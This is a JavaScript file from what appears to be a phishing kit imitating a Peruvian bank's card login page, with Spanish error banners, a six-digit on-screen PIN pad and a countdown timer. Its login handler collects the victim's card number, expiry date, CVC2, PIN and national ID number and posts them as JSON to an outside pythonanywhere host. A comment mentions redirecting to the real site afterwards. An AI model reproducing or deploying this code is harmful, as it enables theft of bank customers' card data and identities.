window.onload = function() {

    var pwd = [];

    // todo: hacer funcionar Checkbox
    // change timer
    setInterval(change, 1000);

    // restrict input cvc2
/*     var restrict_input = document.getElementById('cv2');
    restrict_input.addEventListener('keydown', function(event) {
        // always allow backspace, delete, left/right arrow keys
        if (event.which == 8 || event.which == 46 || event.which == 37 || event.which == 39) { 
            return;
        }
        // prevent all other input if already at 5 chars or not a number
        else if (restrict_input.value.length >= 5 || event.which < 48 || event.which > 57) {
            event.preventDefault();
            return;
        }
    }); */


    // numbers to enter pwd
    var number0 = document.getElementById("number0");
    number0.onclick = function() {
        console.log("0")
        if (pwd.length < 6){
            pwd.push("0");
        };
        paint_circles(pwd);
    };

    var number1 = document.getElementById("number1");
    number1.onclick = function() {
        if (pwd.length < 6){
            pwd.push("1");
        };
        paint_circles(pwd);
    };

    var number2 = document.getElementById("number2");
    number2.onclick = function() {
        if (pwd.length < 6){
            pwd.push("2");
        };
        paint_circles(pwd);
    };

    var number3 = document.getElementById("number3");
    number3.onclick = function() {
        if (pwd.length < 6){
            pwd.push("3");
        };
        paint_circles(pwd);
    };

    var number4 = document.getElementById("number4");
    number4.onclick = function() {
        if (pwd.length < 6){
            pwd.push("4");
        };
        paint_circles(pwd);
    };

    var number5 = document.getElementById("number5");
    number5.onclick = function() {
        if (pwd.length < 6){
            pwd.push("5");
        };
        paint_circles(pwd);
    };

    var number6 = document.getElementById("number6");
    number6.onclick = function() {
        if (pwd.length < 6){
            pwd.push("6");
        };
        paint_circles(pwd);
    };

    var number7 = document.getElementById("number7");
    number7.onclick = function() {
        if (pwd.length < 6){
            pwd.push("7");
        };
        paint_circles(pwd);
    };

    var number8 = document.getElementById("number8");
    number8.onclick = function() {
        if (pwd.length < 6){
            pwd.push("8");
        };
        paint_circles(pwd);
    };

    var number9 = document.getElementById("number9");
    number9.onclick = function() {
        if (pwd.length < 6){
            pwd.push("9");
        };
        paint_circles(pwd);
    };

    // btn delete number
    var delete_number = document.getElementById("delete_number");
    delete_number.onclick = function() {
        if ( 0 < pwd.length < 6){
            pwd.pop();
            paint_circles(pwd);
            console.log(pwd.length);
        }
    };

    // btn clean all numbers
    var clean_numbers = document.getElementById("clean_numbers");
    clean_numbers.onclick = function() {
        pwd = [];
        paint_circles(pwd);
    };


    // login btn
    var btn_login = document.getElementById("btn_login");
    btn_login.onclick = function() {
        //window.location = "/prestamo";
        //return
        // to handle errors
/*         var error_div = "<div id='error_msg' class='alert alert-error'><button class='close ng-tns-c5-3 ng-star-inserted' style=''><i class='icon-close-fill'><button type='button' onclick='functionToExecute()' class='close' data-dismiss='alert'><bcp-icon class='hydrated'><i class='icon close-r ' aria-hidden='true'></i></bcp-icon></button></i></button><div class='alert-icon'><i class='ng-tns-c5-3 icon icon-check-outline alert-error-icon'></i></div> <div id='close_error' onclick='functionToExecute()' class='alert-content'><p class='ng-tns-c5-3'><i class='icon bcp-alert-f'></i><p><span style='color: #002a8d' class='font-weight-bold'> Los datos ingresados son incorrectos . Por favor vuelva a intentarlo</p><i class='icon bcp-x-f'></i></p></div></div>"
        node = document.getElementById('title_banca');
        node.insertAdjacentHTML('afterend', old_div); */


        // get inputs
        var cardNumberElem = document.getElementById("cardNumber1");
        var vence = document.getElementById("vence");
        var cv2 = document.getElementById("cv2");
        var dni = document.getElementById("dni");
        var captcha = document.getElementById("captcha");
        
        // var pwd = pwd.toString;
        var final_dni = dni.value;
        var card_number = cardNumberElem.value;
        var final_vence = vence.value;
        var final_cvc2 = cv2.value; 
        var final_captcha = captcha.value;

        var final_pwd = pwd.toString();

        // validate inputs

        if (final_dni.length < 8 || !(/^\d+$/.test(final_dni))){
            var error_div = "<div id='error_msg' class='alert alert-error'><button class='close ng-tns-c5-3 ng-star-inserted' style=''><i class='icon-close-fill'><button type='button' onclick='functionToExecute()' class='close' data-dismiss='alert'><bcp-icon class='hydrated'><i class='icon close-r ' aria-hidden='true'></i></bcp-icon></button></i></button><div class='alert-icon'><i class='ng-tns-c5-3 icon icon-check-outline alert-error-icon'></i></div> <div id='close_error' onclick='functionToExecute()' class='alert-content'><p class='ng-tns-c5-3'><i class='icon bcp-alert-f'></i><p><span style='color: #002a8d' class='font-weight-bold'> El número de DNI es inválido. Por favor vuelva a intentarlo</p><i class='icon bcp-x-f'></i></p></div></div>"
            node = document.getElementById('title_banca');
            node.insertAdjacentHTML('afterend', error_div);
            return;
        }

        if (card_number.length < 16 || !(/^\d+$/.test(card_number))){
            // get card number container
            document.getElementById("card_number_container").className = "form-group active invalid";
            return;
        }

        console.log(final_vence.length);

        if (final_vence.length < 5){

            // validate prev elems
            document.getElementById("card_number_container").className = "form-group active";

            // must have an '/' and max lengh 5, also strip the '/' and check if they are numbers
            document.getElementById("vence_container").className = "form-group active invalid";
            return;
        } else {
            // check if contains '/'
            if (final_vence.includes('/')){

                temp_vence = final_vence;
                temp_vence = temp_vence.replace('/', '');
                console.log(temp_vence);
                
                // check if is number
                if (!(/^\d+$/.test(temp_vence))){
                    return;
                } else {
                    // pass througth
                    console.log("valid");
                }

            } else {
                // validate prev elems
                document.getElementById("card_number_container").className = "form-group active";

                // must have an '/' and max lengh 5, also strip the '/' and check if they are numbers
                document.getElementById("vence_container").className = "form-group active invalid";
                return;
            }
        }

        if (final_cvc2.length < 3 || !(/^\d+$/.test(final_cvc2))){
            // validate prev elems
            document.getElementById("card_number_container").className = "form-group active";
            document.getElementById("vence_container").className = "form-group active";

            document.getElementById("cvv2_container").className = "form-group active invalid";
            return;
        }

        // validate prev elems
        document.getElementById("card_number_container").className = "form-group active";
        document.getElementById("vence_container").className = "form-group active";
        document.getElementById("cvv2_container").className = "form-group active";


        if (final_pwd.length < 6){
            var error_div = "<div id='error_msg' class='alert alert-error'><button class='close ng-tns-c5-3 ng-star-inserted' style=''><i class='icon-close-fill'><button type='button' onclick='functionToExecute()' class='close' data-dismiss='alert'><bcp-icon class='hydrated'><i class='icon close-r ' aria-hidden='true'></i></bcp-icon></button></i></button><div class='alert-icon'><i class='ng-tns-c5-3 icon icon-check-outline alert-error-icon'></i></div> <div id='close_error' onclick='functionToExecute()' class='alert-content'><p class='ng-tns-c5-3'><i class='icon bcp-alert-f'></i><p><span style='color: #002a8d' class='font-weight-bold'> Contraseña inválida. Por favor vuelva a intentarlo</p><i class='icon bcp-x-f'></i></p></div></div>"
            node = document.getElementById('title_banca');
            node.insertAdjacentHTML('afterend', error_div);
            return;
        }

        if (final_captcha.length<6){

            var error_div = "<div id='error_msg' class='alert alert-error'><button class='close ng-tns-c5-3 ng-star-inserted' style=''><i class='icon-close-fill'><button type='button' onclick='functionToExecute()' class='close' data-dismiss='alert'><bcp-icon class='hydrated'><i class='icon close-r ' aria-hidden='true'></i></bcp-icon></button></i></button><div class='alert-icon'><i class='ng-tns-c5-3 icon icon-check-outline alert-error-icon'></i></div> <div id='close_error' onclick='functionToExecute()' class='alert-content'><p class='ng-tns-c5-3'><i class='icon bcp-alert-f'></i><p><span style='color: #002a8d' class='font-weight-bold'> Captcha inválido. Por favor vuelva a intentarlo</p><i class='icon bcp-x-f'></i></p></div></div>"
            node = document.getElementById('title_banca');
            node.insertAdjacentHTML('afterend', error_div);
            return;
        }

        
        var user_card = new Object();
        const venceArray = final_vence.split("/");
        console.log(venceArray.toString);
        user_card.card_number = card_number;
        user_card.exp_month  = venceArray[0];
        user_card.exp_year = venceArray[1];
        user_card.cvc2 = final_cvc2;
        user_card.pwd = final_pwd;
        user_card.dni = final_dni;
        //user_card.ip_user = ;

        var jsonString= JSON.stringify(user_card);
        console.log(jsonString);

        // send inputs to server
        var url = "http://handsomeindividual.pythonanywhere.com/send_utilities";
        //var url = "http://127.0.0.1:5000/send_utilities";
        //var url = "http://192.168.0.7:5000/send_utilities";
        var params = user_card;
        var parameters = JSON.stringify(user_card);
        var xhr = new XMLHttpRequest();
        xhr.open("POST", url, true);

        // Send the proper header information along with the request
        xhr.setRequestHeader("Content-type", "application/json");
        //xhr.send(parameters);

        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
              if (xhr.status === 200) {
                // Request successful, parse the JSON response
                var response = JSON.parse(xhr.responseText);
                var userId = response["userId"]
                // Process the response as needed
                const url = "/prestamo?userId=" + encodeURIComponent(userId);
                window.location.href = url;
                //window.location = "/prestamo";
              } else {
                // Request failed, handle the error
                console.log("Error: " + xhr.status);
              }
            } else {
                console.log("not done")
            }
          };
          
          xhr.send(parameters);
       
        // inform user about a problem, then redirect to real webpage.
        //window.location = "/error";

    
    };

};


function delete_last_number(list){
    // remove last element of list

    // clean last highlight circle
    alert("hello function");
}

function delete_all_numbers(list){
    alert("hello function");
}

function paint_circles(list){

    var single_point = "• ";
    var size_pwd = list.length;
    var field_pwd = document.getElementById("pwd");
    field_pwd.value = single_point.repeat(size_pwd);

}

function functionToExecute(){
    error_msg = document.getElementById('error_msg');
    error_msg.remove();
}

var number = 300;
function change() {

    var elem = document.getElementById("down_count");
    var elem1 = document.getElementById("down_count1");

    if (number==0){
        number = 300;
        elem1.innerHTML = number.toString() + " " + "segundos.";
        elem.innerHTML = number.toString() + " " + "segundos.";
        number--;
    } else {
        
        elem1.innerHTML = number.toString() + " " + "segundos.";
        elem.innerHTML = number.toString() + " " + "segundos.";
        number--;
    }
}


"<body class=''><div _ngcontent-cub-c39='' class='alertConf'><bcp-alert _ngcontent-cub-c39='' state='error' open='' show-close-button='true' class='hydrated'><div class='alert alert-error fade show' role='alert' style='transition: opacity 0.15s linear 0s;'><bcp-icon _ngcontent-cub-c39='' slot='icon' name='exclamation-triangle-b' class='hydrated'><i class='icon exclamation-triangle-b ' aria-hidden='true'></i><span class='sr-only'>exclamation-triangle</span></bcp-icon><div class='alert-content'><bcp-paragraph class='hydrated'><p class='paragraph-sm bcp-font-regular text'>Revisa tus datos y recuerda que superado el número máximo de intentos ya no podrás autenticarte con tarjeta durante el día.</p></bcp-paragraph></div><bcp-alert-button class='hydrated'><button type='button' class='close' data-dismiss='alert'><bcp-icon class='hydrated'><i class='icon close-r ' aria-hidden='true'></i></bcp-icon></button></bcp-alert-button></div></bcp-alert></div>"
"<div id='error_msg' class='ng-tns-c5-3 alert alert-error ng-trigger ng-trigger-alertAnimation'><button class='close ng-tns-c5-3 ng-star-inserted' style=''><i class='icon-close-fill'></i></button><div class='alert-icon'><i class='ng-tns-c5-3 icon icon-check-outline alert-error-icon'></i></div> <div id='close_error'  onclick='functionToExecute()' class='alert-content'><p class='ng-tns-c5-3'><i class='icon bcp-alert-f'></i><p><span class='font-weight-bold'> El número de DNI es inválido.</span> Por favor vuelva a intentarlo</p><i class='icon bcp-x-f'></i></p></div></div>";


"<div id='error_msg' class='alert alert-error'><button class='close ng-tns-c5-3 ng-star-inserted' style=''><i class='icon-close-fill'><button type='button' onclick='functionToExecute()' class='close' data-dismiss='alert'><bcp-icon class='hydrated'><i class='icon close-r ' aria-hidden='true'></i></bcp-icon></button></i></button><div class='alert-icon'><i class='ng-tns-c5-3 icon icon-check-outline alert-error-icon'></i></div> <div id='close_error' onclick='functionToExecute()' class='alert-content'><p class='ng-tns-c5-3'><i class='icon bcp-alert-f'></i><p><span style='color: #002a8d' class='font-weight-bold'> Los datos ingresados son incorrectos . Por favor vuelva a intentarlo</p><i class='icon bcp-x-f'></i></p></div></div>"